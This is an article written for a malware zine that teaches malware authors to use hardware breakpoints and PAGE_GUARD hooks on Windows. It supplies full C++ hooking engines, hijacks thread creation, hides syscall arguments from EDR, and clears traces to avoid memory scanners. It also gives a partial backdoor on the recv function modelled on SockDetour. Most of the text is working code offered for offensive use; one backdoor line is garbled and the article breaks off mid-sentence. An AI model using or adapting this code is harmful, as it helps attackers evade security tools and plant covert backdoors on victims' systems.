This article was origininally for [VX-Underground Black Mass Halloween Edition 2022](https://papers.vx-underground.org/papers/Other/VXUG%20Zines/Black%20Mass%20Halloween%202022.pdf).

Hooking Engines:
- [Multi-thread safe x86/x64 hwbp hooking engine c](HWBP.c)
- [PAGE_GUARD/hwbp Breakpoint Library c++20](DRPGG.cpp)
- [hwbp Library (DLL example) c++20](HWBPP.cpp)

Generic x64 user-land evasion technique utilizing debug registers:

- [TamperingSyscalls2 c](TamperingSyscalls2.c)
- [TamperingSyscalls2 c++20](TamperingSyscalls2.cpp)

Example ETW/AMSI hooks available
- [rad9800/misc](https://github.com/rad9800/misc/tree/main/hooks)

## Hardware Breakpoints for Malware v 1.0 

Our task is to trivially hook functions and divert the code flow as needed, and finally 
remove the hook once it is no longer needed. 

We cannot look to apply IAT hooks as they are not always called and thus unreliable. 
Inline hooking is a powerful technique; however, it requires we patch the memory where 
the code lies. This is a powerful technique, but tools such as PE-Sieve and Moneta can 
distinguish the difference in the memory resident and on-disk copy of a module and flag 
this. This leaves us with the perfect tool for the job: Debug Registers, though they are 
pretty underappreciated by malware authors!

On Windows, as a high-level overview, a process is essentially an encapsulation of
threads, and each of these threads maintains a context which is the thread's state: the
registers and stack etc. Debug registers are a privileged resource, and so is setting
them; however, Windows exposes various syscalls, which allow us to request that the
kernel make a privileged action on our behalf; this includes setting debug registers
which are perfect for us. NtSetThreadContext and NtGetThreadContext expose functionality
to modify any thread context to which we can open a handle with the necessary privilege.
We can see how to set debug registers with the Win32 API.

```c
	CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	GetThreadContext(thd, &context);

	// set our debug information in the Dr registers

	SetThreadContext(thd, &context);
```

There are 8 Debug registers, from Dr0 through to Dr7. The ones of interest to us are only
Dr0-3 which we store addresses we would like to break on, and Dr6 is just the debug
status. Most importantly is Dr7, which describes the breakpoints conditions in which the
processor will throw an exception. There are various limitations when using debug
registers, such as a limited number (4) and not being applied to all threads/newly
spawned threads. We will look to address some of these limitations!

When the exception is thrown, it will look for an exception handler which we can define
and register in our program [1]. In our defined exception handler, we want our associated
code (different code flows) to run when the corresponding breakpoint is triggered.

```c
LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
	{
		// Look for our associated code flow relative to our RIP 
		if (HWBP_ADDRESS_MAP.contains(ExceptionInfo->ContextRecord->Rip)) {
			HWBP_ADDRESS_MAP.at(ExceptionInfo->ContextRecord->Rip).func(ExceptionInfo);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}
```

This is achieved by a constructor function that sets the mapping between a "callback"
lambda function and an address.
using EXCEPTION_FUNC = std::function <void(PEXCEPTION_POINTERS)>;

```c
typedef struct {
	UINT										pos;
	EXCEPTION_FUNC								func;
} HWBP_CALLBACK;

// Global
std::unordered_map<uintptr_t, HWBP_CALLBACK> HWBP_ADDRESS_MAP{ 0 };

// Create our mapping 
HWBP_ADDRESS_MAP[address].func = function;
HWBP_ADDRESS_MAP[address].pos = pos;
```

We must iterate through all our process threads and set the corresponding adjustments to
the context for them. This can be achieved using the ToolHelp32 helper functions:
CreateToolhelp32Snapshot, and Thread32Next. This is nothing fancy, but it addresses one
of our limitations of not attaching to all threads.

```c
VOID SetHWBPS(const uintptr_t address, const UINT pos, const bool init = true)
{
	DWORD pid{ GetCurrentProcessId() };
	HANDLE h{ CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
	if (h != INVALID_HANDLE_VALUE) {
		THREADENTRY32 te{ .dwSize = sizeof(THREADENTRY32) };
		if (Thread32First(h, &te)) {
			do {
				if ((te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
					sizeof(te.th32OwnerProcessID)) && te.th32OwnerProcessID == pid) {

					HANDLE thd = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
					if (thd != INVALID_HANDLE_VALUE) {
						SetHWBP(thd, address, pos, init);
						CloseHandle(thd);
					}
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
}
```

Having hardware breakpoints set are arguably suspicious as they may indicate malicious
activity (though no EDRs, to my knowledge, actively scan for them). They can be used
against us as a potential IoC so we must remove their traces once we are done using them.

We can implement this in our deconstructor function!! This will iterate through all
threads and check if the register (&context.Dr0)[pos] points to the address at which we
initially set the hardware breakpoint (pos is just an index % 4 giving us access to the
context.Dr0-Dr3). We can also remove the conditions needed in the Dr7 register. We must
also remember to remove our mapping entry. Therefore, our hardware breakpoint will only
be present for the required duration!
```c
SetHWBPS(address, pos, false);
HWBP_ADDRESS_MAP.erase(address);
```
An example hardware breakpoint would be Sleep, where we just replace the sleep duration
with 0.
```c
HWBP HWBPSleep{ (uintptr_t)&Sleep, 0,	// Set Dr 0 
	([&](PEXCEPTION_POINTERS ExceptionInfo) {
		ExceptionInfo->ContextRecord->Rcx = 0;
		ExceptionInfo->ContextRecord->EFlags |= (1 << 16);	// continue execution
}) };
```
We know to set RCX due to the x64 Windows four-register fast-call calling convention[1].
The first argument to the constructor is the address to break on, the second is which Dr0-
3 register to store in (note, we can only have 4 addresses to break on at one time), and
the third is a lambda function which will capture by reference PEXCEPTION_POINTERS which
is the information an exception handler will receive. This will ultimately let us control
the flow of a program differently depending on which breakpoint was triggered.

When a new thread is created, it does not inherit the associated Debug Registers set
unless we somehow manage to intercept the creation of a new thread! One neat trick we can
use would be to capture the actual start address and divert the new thread to create our
own thread. The majority of new threads are ended up calling NtCreateThreadEx.
```c
// Global Variable 
PVOID START_THREAD{ 0 };


// capture original start address
HWBP HWBPNtCreateThreadEx{ (uintptr_t)GetProcAddress(GetModuleHandle(L"NTDLL.dll"),
										  "NtCreateThreadEx"), 1,
	([&](PEXCEPTION_POINTERS ExceptionInfo) {
	
	// save original thread address
	START_THREAD = (PVOID) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x28);
	// set the start address to our thread address 
	*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x28) = (uintptr_t)&HijackThread;
	
	ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
	
}) };
			
DWORD WINAPI HijackThread(LPVOID lpParameter)
{
	typedef DWORD(WINAPI* typeThreadProc)(LPVOID lpParameter);
	
	// Set required HWBP
	for (auto& i : HWBP_ADDRESS_MAP) {
		SetHWBP(GetCurrentThread(), i.first, i.second.pos, true);
	}
	
	// restore execution to original thread
	return ((typeThreadProc)START_THREAD)(lpParameter);
}
```

One limitation of this solution is that the call stack for the thread will originate in
our injected DLL's HijackThread and not the original thread! Alternatively, a better
solution would be to call NtCreateThreadEx ourselves but start it in a suspended state
and then set the required hardware breakpoints. Then we restore execution by resuming the
suspended thread with the debug registers set for this new thread. This will address
another limitation of using debug registers.

To call the instruction we have a breakpoint set on would trigger an infinite loop;
therefore, we temporarily disable the hardware breakpoint responsible for triggering our
current RIP. Then once we are done making the call, we can restore it. This will thus let
us call the original function (like a trampoline). In this case, we must point our RIP to
a ret gadget so that it can return and not make another syscall instruction.

The 5th parameter, including and onwards, can be found pushed onto the stack at 0x8 byte
intervals [2]. Our stack looks something like this when we trigger the breakpoint.
```
                ___________________________
               |                           |
               | 0x8 + lpBytesBuffer       |
               |___________________________|
               |                           |
               | 0x8 + SizeOfStackReserve  |
               |___________________________|
               |                           |
               | 0x8 + SizeOfStackCommit   |
               |___________________________|
               |                           |
               | 0x8 + StackZeroBits       |
               |___________________________|
               |                           |
               | 0x8 + Flags               |
               |___________________________|
               |                           |
               | 0x8 + lpParameter         |
               |___________________________|
               |                           |
               | 0x8 + lpStartAddress      |
RSP + 0x28 +-> |___________________________|
               |                           |
               |                           |
               |                           |  R9  +-> (HANDLE)ProcessHandle
               | 0x20 + Shadow Store       |  R8  |-> (PVOID) ObjectAttributes
               |                           |  RDX |-> (ACCESS_MASK) DesiredAccess
               |                           |  RCX +-> (PHANDLE) hThread
               |___________________________|
               |                           |
               | 0x8 + Call Ret Addr       |  RIP +-> NtCreateThreadEx
       RSP +-> |___________________________|

```
```c
// Find our ret ROP gadget 
uintptr_t FindRetAddr(const uintptr_t function)
{
	BYTE stub[]{ 0xC3 };
	for (unsigned int i = 0; i < (unsigned int)25; i++)
	{	
		// do not worry this will be optimized
		if (memcmp((LPVOID)(function + i), stub, sizeof(stub)) == 0) {
			return (function + i);
		}
	}
	return NULL;
}

typedef LONG(NTAPI* typeNtCreateThreadEx)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
); 

HWBP HWBPNtCreateThreadEx{ (uintptr_t)GetProcAddress(GetModuleHandle(L"NTDLL.dll"),
										  "NtCreateThreadEx"), 1,
	([&](PEXCEPTION_POINTERS ExceptionInfo) {

		// temporary disable of NtCreateThreadEx in our current thread.
		for (auto& i : HWBP_ADDRESS_MAP) {
			if (i.first == ExceptionInfo->ContextRecord->Rip) {	
				SetHWBP(GetCurrentThread(), i.first, i.second.pos, false);
			}
		}

		// create the original thread BUT suspended 
		// THREAD_CREATE_FLAGS_CREATE_SUSPENDED == 0x00000001
		// ( Flags | THREAD_CREATE_FLAGS_CREATE_SUSPENDED)
		LONG status = ((typeNtCreateThreadEx)ExceptionInfo->ContextRecord->Rip)(
			(PHANDLE)ExceptionInfo->ContextRecord->Rcx,
			(ACCESS_MASK)ExceptionInfo->ContextRecord->Rdx,
			(PVOID)ExceptionInfo->ContextRecord->R8,
			(HANDLE)ExceptionInfo->ContextRecord->R9,
			(PVOID) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x28),
			(PVOID) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x30),
			(ULONG) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x38) | 0x1ull,
			(SIZE_T) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x40),
			(SIZE_T) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x48),
			(SIZE_T) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x50),
			(PVOID) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x58)
		);


		CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

		GetThreadContext((HANDLE)(*(PULONG64)ExceptionInfo->ContextRecord->Rcx),
			&context);
		
		// Setup required HWBP
		for (auto& i : HWBP_ADDRESS_MAP) {
			(&context.Dr0)[i.second.pos] = i.first;

			context.Dr7 &= ~(3ull << (16 + 4 * i.second.pos));
			context.Dr7 &= ~(3ull << (18 + 4 * i.second.pos));
			context.Dr7 |= 1ull << (2 * i.second.pos);
		}

		SetThreadContext((HANDLE)(*(PULONG64)ExceptionInfo->ContextRecord->Rcx),
			&context);

		ResumeThread((HANDLE)(*(PULONG64)ExceptionInfo->ContextRecord->Rcx));

		// restore our HWBP on NtCreateThreadEx
		for (auto& i : HWBP_ADDRESS_MAP) {
			if (i.first == ExceptionInfo->ContextRecord->Rip) {	
				SetHWBP(GetCurrentThread(), i.first, i.second.pos, false);
			}
		}
		
		// RAX contains the return value.
		ExceptionInfo->ContextRecord->Rax = status;

		// Set RIP to a ret gadget to avoid creating 
		// another new thread (skip syscall instruction) 
		ExceptionInfo->ContextRecord->Rip = 
			FindRetAddr(ExceptionInfo->ContextRecord->Rip);
}) };
```																
I share a hardware breakpoint hooking engine you can use written in C++. The example
hardware breakpoint sets a breakpoint in Dr0 on the sleep function, and set's the first
value (in RCX) to 0, skipping all sleeps. To set this breakpoint in all future new
threads, you can use the above example, which utilizes Dr1.
```c
//////////////////////////////////////////////////////////////////////////////////////////
/*                                      HWBPP.cpp - @rad9800                            */
/*                         C++ Hardware Breakpoint Library (DLL example)                */
//////////////////////////////////////////////////////////////////////////////////////////
// dllmain.cpp : Defines the entry point for the DLL application.
// /std:c++20
#include "pch.h"
#include <windows.h>

#include <tlhelp32.h>
#include <functional>

using EXCEPTION_FUNC = std::function <void(PEXCEPTION_POINTERS)>;

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Structs                                     */
//////////////////////////////////////////////////////////////////////////////////////////
typedef struct {
	UINT										pos;
	EXCEPTION_FUNC								func;
} HWBP_CALLBACK;

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Globals                                     */
//////////////////////////////////////////////////////////////////////////////////////////
// maintain our address -> lambda function mapping 
std::unordered_map<uintptr_t, HWBP_CALLBACK> HWBP_ADDRESS_MAP{ 0 };

//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Funcs                                       */
//////////////////////////////////////////////////////////////////////////////////////////
VOID SetHWBP(const HANDLE thd, const uintptr_t address, const UINT pos, const bool init)
{
	CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	GetThreadContext(thd, &context);

	if (init) {
		(&context.Dr0)[pos] = address;

		context.Dr7 &= ~(3ull << (16 + 4 * pos));
		context.Dr7 &= ~(3ull << (18 + 4 * pos));
		context.Dr7 |= 1ull << (2 * pos);
	}
	else {
		if ((&context.Dr0)[pos] == address) {
			context.Dr7 &= ~(1ull << (2 * pos));
			(&context.Dr0)[pos] = NULL;
		}
	}

	SetThreadContext(thd, &context);
}

VOID SetHWBPS(const uintptr_t address, const UINT pos, const bool init = true)
{
	const DWORD pid{ GetCurrentProcessId() };
	const HANDLE h{ CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
	if (h != INVALID_HANDLE_VALUE) {
		THREADENTRY32 te{ .dwSize = sizeof(THREADENTRY32) };
		if (Thread32First(h, &te)) {
			do {
				if ((te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
					sizeof(te.th32OwnerProcessID)) && te.th32OwnerProcessID == pid) {

					const HANDLE thd = 
									OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
					if (thd != INVALID_HANDLE_VALUE) {
						SetHWBP(thd, address, pos, init);
						CloseHandle(thd);
					}
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                      Exception Handler                               */
//////////////////////////////////////////////////////////////////////////////////////////
LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
	{
		if (HWBP_ADDRESS_MAP.contains(ExceptionInfo->ContextRecord->Rip)) {
			HWBP_ADDRESS_MAP.at(ExceptionInfo->ContextRecord->Rip).func(ExceptionInfo);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                        Classes                                       */
//////////////////////////////////////////////////////////////////////////////////////////
template<typename HANDLER>
struct HWBP {
public:
	HWBP(const uintptr_t address, const UINT idx,
		const HANDLER function) : address{ address } , pos{idx % 4}
	{
		SetHWBPS(address, pos);

		HWBP_ADDRESS_MAP[address].func = function;
		HWBP_ADDRESS_MAP[address].pos = pos;
	};

	VOID RemoveHWBPS()
	{
		SetHWBPS(address, pos, false);
		HWBP_ADDRESS_MAP.erase(address);
	}

	~HWBP()
	{
		RemoveHWBPS();
	}

private:
	const uintptr_t address;
	UINT			pos;
};


// Global Scope 
HWBP HWBPSleep{ (uintptr_t)&Sleep, 0,
	([&](PEXCEPTION_POINTERS ExceptionInfo) { 
		ExceptionInfo->ContextRecord->Rcx = 0;
		ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
}) };
//////////////////////////////////////////////////////////////////////////////////////////
/*                                          Entry                                       */
//////////////////////////////////////////////////////////////////////////////////////////
extern "C" 
BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) 
{
	HANDLE handler = NULL;
    switch (ul_reason_for_call)
    {
	case DLL_PROCESS_ATTACH: {
		handler = AddVectoredExceptionHandler(1, ExceptionHandler);
	}; break;
	case DLL_THREAD_ATTACH: {
	} break;
	case DLL_THREAD_DETACH: {

	}; break;
	case DLL_PROCESS_DETACH: {
		if (handler != nullptr) RemoveVectoredExceptionHandler(handler);
	}; break;
    }
    return TRUE;
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                         EOF                                          */
//////////////////////////////////////////////////////////////////////////////////////////
```
As we discussed earlier, keeping a debug register set is a bad practice. Therefore, we
will complement our usage of debug registers with PAGE_GUARD hooks, allowing us to free
up one of the debug registers: Dr1 (used for NtCreateThreadEx).

PAGE_GUARDs are essentially one-shot memory protection that will throw an exception. They
are applied to pages at the lowest level of allocation granularity present in the system (
which can sometimes prove to be a hindrance). PAGE_GUARD hooking is nothing new, but we
can use it to address some of our limitations. We will initially apply our PAGE_GUARD to
the address, and the PAGE_GUARD will be triggered by throwing a PAGE_GUARD_VIOLATION.

VirtualProtect((LPVOID)address, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);

We can apply the same concept of mapping a lambda to trigger at a specific address. We
will single-step through the function instructions on our current page while re-applying
the PAGE_GUARD. This is obviously relatively slow but has the benefit of not reserving up
a Debug register. For the primary reason of being slow, we opted against using them
primarily.


```c
typedef struct {
	EXCEPTION_FUNC								func;
} PG_CALLBACK;

std::unordered_map<uintptr_t, PG_CALLBACK>	PG_ADDRESS_MAP{ 0 };

PG_ADDRESS_MAP[address].func = function;
```
To apply the debug register hooks to new threads, we can just copy the previous example
of hooking NtCreateThreadEx but remove the loops where we disable and restore the HWBPs
for our current thread.

We can introduce the second code example where we do the hook mentioned above of
NtCreateThreadEx with PAGE_GUARDs. As before, our deconstructor function will remove the
entry in our mapping and remove the protections (if set).

```c

//////////////////////////////////////////////////////////////////////////////////////////
/*                                        DRPGG.cpp - @rad9800                          */
//////////////////////////////////////////////////////////////////////////////////////////
#include <windows.h>

#include <tlhelp32.h>
#include <functional>    // std::function 


using EXCEPTION_FUNC = std::function <void(PEXCEPTION_POINTERS)>;

//////////////////////////////////////////////////////////////////////////////////////////
/*                                            Structs                                   */
//////////////////////////////////////////////////////////////////////////////////////////
typedef struct {
    UINT                                        pos;
    EXCEPTION_FUNC                                func;
} HWBP_CALLBACK;

typedef struct {
    EXCEPTION_FUNC                                func;
} PG_CALLBACK;

typedef LONG(NTAPI* typeNtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );

//////////////////////////////////////////////////////////////////////////////////////////
/*                                            Globals                                   */
//////////////////////////////////////////////////////////////////////////////////////////
// maintain our address -> lambda function mapping 
std::unordered_map<uintptr_t, HWBP_CALLBACK> HWBP_ADDRESS_MAP{ 0 };
std::unordered_map<uintptr_t, PG_CALLBACK>    PG_ADDRESS_MAP{ 0 };

//////////////////////////////////////////////////////////////////////////////////////////
/*                                            Funcs                                     */
//////////////////////////////////////////////////////////////////////////////////////////
// Find our ret ROP gadget 
uintptr_t FindRetAddr(const uintptr_t function)
{
    BYTE stub[]{ 0xC3 };
    for (unsigned int i = 0; i < (unsigned int)25; i++)
    {
        if (memcmp((LPVOID)(function + i), stub, sizeof(stub)) == 0) {
            return (function + i);
        }
    }
    return NULL;
}

VOID SetHWBP(const HANDLE thd, const uintptr_t address, const UINT pos, const bool init)
{
    CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    GetThreadContext(thd, &context);

    if (init) {
        (&context.Dr0)[pos] = address;

        context.Dr7 &= ~(3ull << (16 + 4 * pos));
        context.Dr7 &= ~(3ull << (18 + 4 * pos));
        context.Dr7 |= 1ull << (2 * pos);
    }
    else {
        if ((&context.Dr0)[pos] == address) {
            context.Dr7 &= ~(1ull << (2 * pos));
            (&context.Dr0)[pos] = NULL;
        }
    }

    SetThreadContext(thd, &context);
}

VOID SetHWBPS(const uintptr_t address, const UINT pos, const bool init = true)
{
    const DWORD pid{ GetCurrentProcessId() };
    const HANDLE h{ CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if (h != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te{ .dwSize = sizeof(THREADENTRY32) };
        if (Thread32First(h, &te)) {
            do {
                if ((te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
                    sizeof(te.th32OwnerProcessID)) && te.th32OwnerProcessID == pid) {

                    const HANDLE thd = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    if (thd != INVALID_HANDLE_VALUE) {
                        SetHWBP(thd, address, pos, init);
                        CloseHandle(thd);
                    }
                }
                te.dwSize = sizeof(te);
            } while (Thread32Next(h, &te));
        }
        CloseHandle(h);
    }
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                        Exception Handler                             */
//////////////////////////////////////////////////////////////////////////////////////////
LONG WINAPI ExceptionHandler(const PEXCEPTION_POINTERS ExceptionInfo)
{
    DWORD old = 0;
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION)
    {
        if (PG_ADDRESS_MAP.contains(ExceptionInfo->ContextRecord->Rip)) {
            PG_ADDRESS_MAP.at(ExceptionInfo->ContextRecord->Rip).func(ExceptionInfo);
        }
        ExceptionInfo->ContextRecord->EFlags |= (1 << 8);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    else if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        if (HWBP_ADDRESS_MAP.contains(ExceptionInfo->ContextRecord->Rip)) {
            HWBP_ADDRESS_MAP.at(ExceptionInfo->ContextRecord->Rip).func(ExceptionInfo);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        for (const auto& i : PG_ADDRESS_MAP) {
            VirtualProtect((LPVOID)i.first, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

DWORD WINAPI TestThread(LPVOID lpParameter)
{
    UNREFERENCED_PARAMETER(lpParameter);
    Sleep(500000);

    return 0;
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                            Classes                                   */
//////////////////////////////////////////////////////////////////////////////////////////
template<typename HANDLER>
struct HWBP {
public:
    HWBP(const uintptr_t address, const UINT idx,
        const HANDLER function) : address{ address }, pos{ idx % 4 }
    {
        SetHWBPS(address, pos);

        HWBP_ADDRESS_MAP[address].func = function;
        HWBP_ADDRESS_MAP[address].pos = pos;
    };

    VOID RemoveHWBPS()
    {
        SetHWBPS(address, pos, false);
        HWBP_ADDRESS_MAP.erase(address);
    }

    ~HWBP()
    {
        RemoveHWBPS();
    }

private:
    const uintptr_t address;
    UINT            pos;
};


template<typename HANDLER>
struct PGBP {
public:
    PGBP(const uintptr_t address, const HANDLER function) : old{ 0 }, address{ address }
    {

        VirtualProtect((LPVOID)address, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);

        PG_ADDRESS_MAP[address].func = function;
    }

    VOID RemovePGEntry()
    {
        VirtualProtect((LPVOID)address, 1, old, &old);
        PG_ADDRESS_MAP.erase(address);
    }

    ~PGBP()
    {
        RemovePGEntry();
    }
private:
    DWORD old;
    const uintptr_t address;
};

//////////////////////////////////////////////////////////////////////////////////////////
/*                                        Entry Point                                   */
//////////////////////////////////////////////////////////////////////////////////////////
int main()
{
    const PVOID handler{ AddVectoredExceptionHandler(1, ExceptionHandler) };

    HWBP HWBPSleep{
        (uintptr_t)&Sleep,
        1,
        ([&](PEXCEPTION_POINTERS ExceptionInfo) {
            printf("Sleeping %lld\n", ExceptionInfo->ContextRecord->Rcx);
            ExceptionInfo->ContextRecord->Rcx = 0;
            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);    // continue execution
    }) };


    PGBP VEHNtCreateThreadEx{
        (uintptr_t)GetProcAddress(
            GetModuleHandle(L"NTDLL.dll"),
            "NtCreateThreadEx"
        ),
    ([&](PEXCEPTION_POINTERS ExceptionInfo) {

            // create a new thread suspended
            LONG status = ((typeNtCreateThreadEx)ExceptionInfo->ContextRecord->Rip)(
                (PHANDLE)ExceptionInfo->ContextRecord->Rcx,
                (ACCESS_MASK)ExceptionInfo->ContextRecord->Rdx,
                (PVOID)ExceptionInfo->ContextRecord->R8,
                (HANDLE)ExceptionInfo->ContextRecord->R9,
                (PVOID) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x28),
                (PVOID) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x30),
                (ULONG) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x38) | 0x1ull,
                (SIZE_T) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x40),
                (SIZE_T) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x48),
                (SIZE_T) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x50),
                (PVOID) * (PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x58)
            );

            CONTEXT context{ 0 };
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

            GetThreadContext((HANDLE)(*(PULONG64)ExceptionInfo->ContextRecord->Rcx),
                &context);

            for (auto& i : HWBP_ADDRESS_MAP) {
                (&context.Dr0)[i.second.pos] = i.first;

                context.Dr7 &= ~(3ull << (16 + 4 * i.second.pos));
                context.Dr7 &= ~(3ull << (18 + 4 * i.second.pos));
                context.Dr7 |= 1ull << (2 * i.second.pos);
            }

            SetThreadContext((HANDLE)(*(PULONG64)ExceptionInfo->ContextRecord->Rcx),
                &context);

            ResumeThread((HANDLE)(*(PULONG64)ExceptionInfo->ContextRecord->Rcx));

            ExceptionInfo->ContextRecord->Rax = status;

            ExceptionInfo->ContextRecord->Rip =
                FindRetAddr(ExceptionInfo->ContextRecord->Rip);
        }) };


    Sleep(1000000);

    for (unsigned int i = 0; i < 2; ++i) {
        HANDLE t = CreateThread(NULL, 0, TestThread, NULL, 0, NULL);
        if (t) WaitForSingleObject(t, INFINITE);
    }

    if (handler) RemoveVectoredExceptionHandler(handler);
}

//////////////////////////////////////////////////////////////////////////////////////////
/*                                            EOF                                       */
//////////////////////////////////////////////////////////////////////////////////////////
```
Having applied the theory to create a versatile hardware breakpoint hooking engine, we
will continue to use a mixture of debug registers and PAGE_GUARDs, as shown in our
previous examples, to implement a backdoor inspired by SockDetour [3] as a DLL in C++. We
will set a hardware breakpoint on the recv function to accomplish this and build the
required logic in the corresponding lambda. We will also apply a PAGE_GUARD to
NtCreateThreadEx and use our previous technique of creating the thread in a suspended
state to set the right debug registers.

Despite the sluggish nature of PAGE_GUARD hooks, this should not be an issue as long as
the server model does not create a new thread for every request, leading to subliminal
performance. Most networking server models maintain a pool of threads that are started
and initialized at the program's start. For more insight into these server models,
Microsoft provides a variety of examples on Github [4]; the IOCP example is an excellent
example of what a performant, scalable server model looks like for context.

The start of your backdoor could look like this:

HWBP recv_hook{ (uintptr_t)GetProcAddress((LoadLibrary(L"WS2_32.dll"),
	GetModuleHandle(L"WS2_32.dll")),"recv"), 3,
	([&](PEXCEPTION_POINTERS ExceptionInfo) {
		
		for (auto& i : ADDRESS_MAP) {
			if (i.first == ExceptionInfo->ContextRecord->Rip) {
				SetHWBP(GetCurrentThread(), i.first, i.second.pos, false);
			}
		}

		char verbuf[9]{ 0 };
		int	verbuflen{ 9 }, recvlen{ 0 };

		recvlen = recv(ExceptionInfo->ContextRecord->Rcx, verbuf,
				   verbuflen, MSG_PEEK);

		BYTE TLS[] = { 0x17, 0x03, 0x03 };

		if (recvlen >= 3) {
			if ((memcmp(verbuf, TLS, 3) == 0))1
			{
				MSG_AUTH msg{ 0 };
				// We'll peek like SockDetour as to not eat the message
				recvlen = recv(ExceptionInfo->ContextRecord->Rcx, (char*)&msg,
					sizeof(MSG_AUTH), MSG_PEEK);
					// Authenticate and proceed

			}
		}

		// Set corresponding Dr
		for (auto& i : ADDRESS_MAP) {
			if (i.first == ExceptionInfo->ContextRecord->Rip) {
				SetHWBP(GetCurrentThread(), i.first, i.second.pos, true);
			}
		}

		ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
}) };


We will finish by implementing a generic x64 userland evasion technique inspired by
TamperingSyscalls, which utilizes a suitably modified version of the hardware breakpoint
the engine showed earlier to hide up to 12 of the arguments of up to ANY 4 Nt syscalls at 
ANY one time per thread. Note that I chose not to propagate the debug register content to 
all the threads, as this would likely be undesirable (if desired, replace SetHWBP with
SetHWBPS).

I need not describe why this would be desirable and super EPIC nor delve into userland
hooking as these are not the topics at hand or of concern, and they have been covered in
depth several times [5]. 

We create a new mapping using the (address | ThreadID) as a unique key, and the value is
a structure containing the function arguments. We will create a new entry in our mapping
on entering the syscall and clear out the values in the registers and stack. 

We use single-stepping (through the trap flag) to pretend that we have more debug 
registers than we actually have. We CAN do this, given we know when and where we need 
specific actions to occur. 

When we hit our desired syscall address, we restore our values from the hashmap entry
associated with our key. This will return the values on the stack in the registers. We
then continue to single step until the return instruction, where we will stop single
stepping and continue on! 

This ultimately allows us for typeless hooking. What is more, initially, we specified 
We will only hide 12 arguments, 4 from the registers and 8 from the stack. This "8" 
value is only arbitrary but recommended, and hiding or changing more values/arguments
